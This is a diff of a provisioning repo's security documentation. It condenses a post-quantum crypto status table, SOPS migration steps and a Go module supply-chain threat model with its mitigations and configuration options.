-| --- | --- | --- | --- |
-| SSH key exchange | mlkem768x25519-sha256 | **Quantum-safe** (hybrid ML-KEM + X25519) | 128-bit post-quantum |
-| SSH auth keys | ed25519-sk (FIDO2) | **Classical only** — no PQ hardware key support yet | 128-bit classical |
-| Vault encryption | AES-256-CTR (ansible-vault) | **Quantum-safe** — Grover halves bits: 128-bit effective | 128-bit post-quantum |
-| Vault password | HMAC-SHA1 (YubiKey OTP slot) | **Marginal** — Grover: 80-bit effective security | 80-bit post-quantum |
-| Vault password (migration path) | PIV P-384 | **Classical only** | 96-bit post-quantum |
-| Git commit signing | ed25519-sk (SSH signing) | **Classical only** | 128-bit classical |
-
-The vault password migration path uses age-plugin-yubikey 0.5.1, which is production-ready and recommended for migration in 2026.
-
-**SSH key exchange is already quantum-safe** — `mlkem768x25519-sha256` is
-first in `KexAlgorithms`. Data in transit is protected against harvest-now/
-decrypt-later attacks today.
-
-**The vault password (HMAC-SHA1) is the weakest link at 80-bit post-quantum
-security.** YubiKey OTP slots are hardware-limited to HMAC-SHA1; HMAC-SHA256
-is not available in firmware. 80-bit security is currently considered
-sufficient (the largest quantum computers in 2025 have ~2,000 noisy qubits,
-far short of the millions needed for Grover attacks).
-
-### August 2026 status
-
-- **YubiKey 5.8** (released July 2026): no PQ algorithms in production; a PQ
-  prototype was demonstrated Oct 2025; hardware PQ support is estimated ~2027.
-- **ykpersonalize** reached EOL in Feb 2026; new scripts should prefer `ykman`.
-  `setup-yubikeys.sh` uses `ykman otp chalresp` for HMAC-SHA1 slot programming.
-- **age-plugin-yubikey 0.5.1**: production-ready; 2026 recommended migration path
-  from `ansible-vault`. See *Future Migration to SOPS + age* below.
-- **SOPS + age-plugin-yubikey**: 2026 community consensus for hardware-key-backed
-  secrets in Ansible automation tooling.
-
-### Migration path when hardware PQ support arrives
-
-1. Yubico ships a YubiKey with HMAC-SHA256 (or ML-DSA) support
-2. Re-run `make setup-yubikeys` (new secret; new algorithm)
-3. `ansible-vault rekey group_vars/all/vault.yml`
-4. Regenerate SSH keys with PQ hardware key if available
-
-## Future Migration to SOPS + age
-
-2026 community consensus for hardware-key-backed secrets in Ansible tooling.
-Recommended when migrating away from `ansible-vault`'s HMAC-SHA1 vault password.
-
-### Prerequisites (Fedora)
-
-```bash
-sudo dnf install pcsc-lite-devel pcscd age sops
-sudo systemctl enable --now pcscd
-# age-plugin-yubikey is not in Fedora repos; build from crates.io:
-cargo install age-plugin-yubikey   # lands in ~/.cargo/bin/
-ansible-galaxy collection install community.sops
-```
-
-### PIV key setup (EC P-384, slot 9a)
-
-```bash
-ykman piv keys generate --algorithm ECCP384 9a
-ykman piv certificates generate --subject 'age-yubikey' 9a
-age-plugin-yubikey          # follow prompts to generate key and get recipient string
-age-plugin-yubikey --identity --slot 1 > yubikey-identity.txt
-age-plugin-yubikey --list   # prints age1yubikey1… recipient string
-```
-
-### Configure SOPS (`.sops.yaml` at repo root)
-
-```yaml
-creation_rules:
-  - path_regex: group_vars/.*\.sops\.ya?ml
-    key_groups:
-      - age:
-          - age1yubikey1<RECIPIENT>
-```
-
-### `ansible.cfg` update
-
-```ini
-[defaults]
-vars_plugins_enabled = host_group_vars,community.sops.sops
-```
-
-### Migrate `vault.yml` (one-way; irreversible)
-
-```bash
-ansible-vault decrypt group_vars/all/vault.yml
-mv group_vars/all/vault.yml group_vars/all/vault.sops.yml
-sops -i --encrypt group_vars/all/vault.sops.yml
-sops -d group_vars/all/vault.sops.yml   # verify decryption works
-git rm group_vars/all/vault.yml
-git add group_vars/all/vault.sops.yml
-```
-
-**Runtime:** set `SOPS_AGE_KEY_FILE=/path/to/yubikey-identity.txt` before
-running Ansible. Each decryption requires PIN entry + YubiKey touch. The
-`community.sops.sops` vars plugin auto-decrypts `*.sops.yml` files in
-`group_vars`/`host_vars`.
-
-SOPS encrypts per-value — variable names (e.g. `vault_ssh_private_key:`)
-remain plaintext in the committed file; only values are ciphertext. This
-differs from `ansible-vault`, which encrypts the entire file as a single blob.
+`ykman fido info` shows PIN state. sshd hardening accepts only ed25519 and FIDO2 (`sk-ssh-ed25519`) keys.
 
 ## Go Module Supply Chain
 
-**CRITICAL VULNERABILITY**: Go tools installed via `go install` (gofumpt, gopls, golangci-lint,
-govulncheck, gci, controller-gen, client-gen, subctl, stern) are susceptible to init() code
-injection during compilation. Unlike binary downloads, `go install` executes arbitrary code
-during the build process with full user privileges (or sudo). This attack is **undetectable
-by Ansible return code checks** because init() executes before compilation completes, and
-successful compilation returns rc=0 regardless of malicious side effects.
+Go tools installed with `go install` (gofumpt, gopls, golangci-lint, govulncheck, gci, stern, controller-gen, the k8s code-generator
+tools, subctl; work profile only) pull dozens of transitive dependencies each.
 
-**Attack Vector & Why It's Undetectable**:
+**Threat model.** `go install` compiles and does not run package `init()` code; injected code runs the first time the installed tool is
+executed, with the user's privileges. Go's module checksum database (GOSUMDB) detects tampered module content and proxy tampering. It does
+not detect a malicious release published by a compromised maintainer, GOPROXY or TLS hijack of the first fetch, typosquatting, or a
+backdoored
+dependency that already has a valid checksum. It covers the whole build list, not only direct modules. Built binaries are not hash-pinned:
+their bytes depend on the local toolchain and flags, so no upstream binary hash exists.
 
-1. **init() Execution Timeline**: Go's init() functions run when the built binary starts
-   (the first time the installed tool is executed), NOT during `go install`. An attacker who
-   compromises a Go module dependency can inject code that silently exfiltrates SSH keys,
-   modifies /etc/passwd, installs SSH backdoors, or patches binaries — all when the tool runs.
+**Mitigations** (`roles/packages/tasks/install_go_tools.yml`):
 
-2. **Compilation Succeeds**: Building a module with malicious init() code succeeds, and `go install` completes
-   normally with rc=0. Ansible sees rc=0 and marks the task as succeeded (changed_when: true).
+1. **Version pinning** in `roles/packages/defaults/main.yml` (`packages_*_version`); bumps need deliberate review
+2. **GONOSUMDB validation** — the effective `GONOSUMDB`/`GOPRIVATE` value may contain only private patterns; public hosts, wildcard
+   owners, patterns covering the installed public tools and unsupported glob syntax are rejected
+3. **GOSUMDB enforcement** — set to `sum.golang.org` (default; override with `packages_gosumdb`), must not be `off` or empty, and the
+   server must be reachable for Go tool installs to run (if unreachable, they are skipped with a warning and the play does not fail); CI
+   also rejects a disabled GOSUMDB
+4. **No retry on integrity failures** — only transient `permission denied` is retried; checksum mismatches fail fast
+5. **Sanity checks** — `scripts/smoke-test.sh` runs each Go tool's version command (`--version`; `gopls` and `subctl` use `version`,
+   `govulncheck` uses `-version`); this does not catch stealthy payloads
+6. **Isolation** — `make container` provisions the dev tier in a distrobox, which bind-mounts `$HOME` (same UID) and is not a credential
+   boundary: host `~/.ssh`, `~/.gnupg`, and `scripts/vault-pass.sh` (when the checkout is under `$HOME`) are readable inside it. Mount-level
+   isolation is not configured by this repo.
 
-3. **No Code Inspection**: Unlike binary downloads (which can be checksummed), Go binaries are
-   non-deterministic. Two builds of the same source with identical inputs produce different
-   binaries. This makes post-hoc verification impossible.
+**Hardening options by risk:**
 
-4. **GOSUMDB Cannot Distinguish Legitimate from Backdoored**: If a module maintainer is compromised,
-   they can push backdoored code alongside real functionality. GOSUMDB validates the module hash,
-   not the code behavior. XZ Utils 2024 (CVE-2024-3094) demonstrated exactly this: malicious
-   init() code in build-time dependencies went undetected until after release.
+- Baseline: pinned versions, GOSUMDB, `govulncheck` on your own projects, periodic `make smoke-test`
+- Monitoring: enable AIDE (`system_aide_enabled: true`) and audit rules for credential paths; inspect `journalctl` after installs
+- Isolation: do untrusted code review and testing only inside the `make container` environment
+- Strict: install pre-built release binaries with verified checksums or signatures where upstreams publish them, use an internal vetted
+  proxy, or provision from an air-gapped mirror
 
-**Affected Modules** (work profile only):
-
-- mvdan.cc/gofumpt (formatter)
-- golang.org/x/tools/gopls (language server — large dependency tree)
-- golang.org/x/vuln/cmd/govulncheck (vulnerability scanner)
-- github.com/daixiang0/gci (import organizer)
-- github.com/golangci/golangci-lint (linter suite — 50+ dependencies)
-- sigs.k8s.io/controller-tools/cmd/controller-gen (API codegen — k8s dependency tree)
-- k8s.io/code-generator/* (Kubernetes client-gen, informer-gen, etc. — 100+ dependencies)
-- github.com/submariner-io/subctl (cluster management)
-- github.com/stern/stern (Kubernetes log viewer)
-
-Each module pulls in dozens of transitive dependencies, multiplying attack surface.
-
-**GONOSUMDB Limitations** (does NOT protect against):
-
-- GOPROXY hijacking (transparent proxy, BGP hijack, DNS spoofing)
-- Upstream maintainer account compromise (GitHub, golang.org OAuth, NPM-style account takeover)
-- TLS MITM attacks on go.googlesource.com (sumdb validation adds a second trust boundary,
-  but does not protect against the first fetch of the module list or GOPROXY responses)
-- Typosquatting and module registry typos (registry content is not audited)
-- Supply chain attacks on transitive dependencies (a dependency of a dependency)
-
-**Current Mitigations** (defense-in-depth, but incomplete):
-
-1. **VERSION PINNING** — All tools pinned to specific versions in `defaults/main.yml`
-   (e.g., `packages_gofumpt_version`). Prevents silent upstream updates. Requires
-   deliberate human review before version bumps. Does NOT prevent compromise of pinned version.
-
-2. **GONOSUMDB VALIDATION** — Pre-provision assert (install_go_tools.yml:24-27) validates that
-   GONOSUMDB is either unset (use sum.golang.org for all modules) or contains only private/internal
-   domain patterns (e.g., `*.internal.com`). Empty string `GONOSUMDB=""` is also rejected to prevent
-   accidental bypass of checksum verification. This enforces explicit opt-in for public modules
-   and prevents silent disabling of GOSUMDB. Does NOT prevent GOSUMDB bypass via account compromise.
-
-3. **GOSUMDB ENFORCEMENT** — Task sets `GOSUMDB=sum.golang.org` (or corporate proxy).
-   Validates module checksums against a second hash database. Defense-in-depth against GOPROXY
-   tampering. However, does NOT detect:
-   - Legitimate code that has been backdoored by a compromised maintainer
-   - Transitive dependency compromises (depends on sum.golang.org, which only validates direct modules)
-
-4. **RETRY LIMIT** — Retries (3x) only on transient `permission denied` errors, never on
-   checksum mismatches or other failures (see the `go install` task's `until:` in install_go_tools.yml). Fails fast on integrity violations
-   rather than masking them with `failed_when: false`.
-
-5. **SANITY-CHECK VALIDATION** — Post-install `--version` check (scripts/smoke-test.sh tool version loop) runs each
-   tool once to catch obvious corruption. Does NOT detect stealthy init() attacks (malicious code
-   can suppress stderr, avoid process state changes, and exfiltrate silently).
-
-6. **GOVULNCHECK** — `govulncheck` can be run manually against installed modules to detect known CVEs
-   (smoke tests only check that the binary is present). Reactive signal only; does NOT detect zero-day
-   compromises.
-
-7. **DISTROBOX ISOLATION** — Work profile can provision tools in a containerized dev tier
-   (`make container`). Container isolation limits blast radius: containers cannot directly
-   access host SSH keys, mounted volumes, or system resources by default. Requires explicit
-   setup to share volumes or forward sockets.
-
-**Why Current Mitigations Are Insufficient**:
-
-The file `roles/packages/tasks/install_go_tools.yml` contains
-explicit documentation (lines 5-11) acknowledging init() injection risk and noting that
-GOSUMDB is the integrity mechanism with a known maintainer-compromise gap. This is
-incomplete: GOSUMDB protects against GOPROXY tampering, NOT
-against maintainer compromise, supply chain attacks, or typosquatting.
-
-**Recommended Hardening** (risk-based selection):
-
-**Tier 1 (Low Risk)** — Current approach is acceptable if:
-
-- You trust Go module maintainers and your network
-- You monitor govulncheck output after provisioning
-- You audit tool behavior post-install (see "Post-Install Audit" below)
-- You are comfortable with 128-bit classical cryptographic security (GOSUMDB uses SHA-256)
-
-**Tier 2 (Medium Risk)** — Add post-install monitoring:
-
-- Run `govulncheck ./...` in each project after provisioning (detects known vulnerabilities)
-- Set `system_aide_enabled: true` in `config.yml` and enable AIDE logging to catch unauthorized
-  file modifications post-provision
-- Use `auditctl` to monitor process execution and exfiltration attempts (kernel audit logs)
-- Regularly run `make smoke-test` to verify tools have not been modified
-
-**Tier 3 (High Risk)** — Mandatory isolation:
-
-- **Use `make container` to provision dev tools in a distrobox/toolbox container**
-- Work exclusively inside the container for untrusted code review or testing
-- Container cannot access host SSH keys (`/home/$USER/.ssh`) unless explicitly mounted
-- Container cannot execute host commands or modify host /etc unless volume-mapped
-- Containers can be destroyed and re-created on demand; host remains clean
-
-**Tier 4 (Critical Sensitivity)** — Consider alternatives:
-
-- Install Go tools from pre-compiled GitHub Releases with SHA256 signatures
-  (golangci-lint publishes GPG-signed releases; gofumpt publishes SHA256 hashes)
-- Use distrobox with `nix develop` or Guix for reproducible, auditable environments
-- If available, use corporate-approved tool proxies that pre-vet dependencies
-- Air-gap development machines (isolate from network entirely during provisioning)
-
-**Post-Install Audit Procedure** (manual verification after `make all`):
-
-```bash
-# 1. Check for obvious init() side effects (file modifications outside GOPATH)
-ls -la ~/.ssh/id_* ~/.gnupg/ /etc/passwd  # Verify timestamps are pre-provisioning
-auditctl -w /etc/passwd -p wa -k passwd_watch  # Enable real-time audit
-tail -f /var/log/audit/audit.log
-
-# 2. Run govulncheck to detect known CVEs in installed modules
-govulncheck ./...
-
-# 3. Verify tools with --version (sanity check for binary corruption)
-gofumpt --version && gopls version && golangci-lint --version
-
-# 4. Monitor Go tool process execution (if AIDE is enabled)
-aide --check | grep "changed"
-
-# 5. Check for exfiltration in system logs (network activity during go install)
-journalctl -S "30 minutes ago" | grep -E "gofumpt|gopls|golangci|go install"
-
-# 6. If running on CSB, request IT audit of /var/log/messages for suspicious activity
-```
-
-**CSB (Corporate Standard Build) Fallback**:
-
-On RHEL CSB with fapolicyd enforcement, `go install` is restricted by default. The playbook
-catches network failures and routes to `csb_rhel` rescues. Go tool installation failures on
-CSB are expected if fapolicyd blocks /tmp compilation. Options:
-
-1. Configure GOPROXY via corporate proxy (set `packages_goproxy` and `packages_gosumdb_proxy` in config.yml)
-2. Request IT whitelist for go.googlesource.com and sum.golang.org
-3. Use pre-built binaries instead (download from GitHub Releases; see install_binary_downloads.yml)
-4. Run tools inside distrobox container (fapolicyd may exempt container):
-
-   ```bash
-   make container
-   distrobox enter <container-name> -- gofumpt --version
-   ```
-
-**Configuration**:
-
-Users who need stricter Go module controls can set environment variables in `config.yml`:
+**Configuration** (`config.yml`):
 
 ```yaml
-packages_gosumdb_proxy: "sum.myproxy.com"  # Point to corporate proxy
-dotfiles_gonosumdb: "*.internal.com,*.example.com"  # Exempt private domains from sumdb
-packages_goproxy: "https://myproxy.com/go,direct"  # Use corporate proxy + direct fallback
+packages_gosumdb: "sum.example.com"                          # corporate sumdb (FQDN or FQDN:port)
+dotfiles_gonosumdb: "*.internal.example.com"                  # private module domains only
+packages_goproxy: "https://goproxy.example.com,direct"        # corporate proxy with direct fallback
 ```
 
-For air-gapped environments, set `packages_goproxy: 'off'` or point to internal proxy only.
+For air-gapped environments set `packages_goproxy: 'off'` or point it at an internal proxy only.
 
-**Recommendation**:
+**Corporate builds with fapolicyd** may block `go install` compilation in `/tmp`. Options: set the proxy variables above, ask your IT team
+to allow `proxy.golang.org` and `sum.golang.org`, use pre-built binaries where the repo provides them (`install_binary_downloads.yml`:
+kind, helm, kustomize, k9s; oc/kubectl/opm via `install_oc_opm.yml`; standalone tools via `install_standalone_binaries.yml`; none of the
+Go tools listed above), or run the tools inside the container (`make container`, then
+`distrobox enter <container-name> -- gofumpt --version`).
 
-1. **Always pin versions** — Current practice is good. Verify version bumps carefully.
-2. **Monitor govulncheck output** — Run manually and review after provisioning.
-3. **For sensitive work: use `make container`** — Isolate Go tools in distrobox. Rebuild
-   container monthly or after major tool updates.
-4. **Treat go install like make bootstrap** — It downloads and executes untrusted code.
-   Run on isolated network or inside container. Defer to distrobox tier for production work.
-5. **Report supply chain issues** — If you detect suspicious behavior post-provisioning,
-   report to <go-security@golang.org> (Go security team) with detailed reproduction steps.
+Report supply chain issues in Go itself to <security@golang.org>.
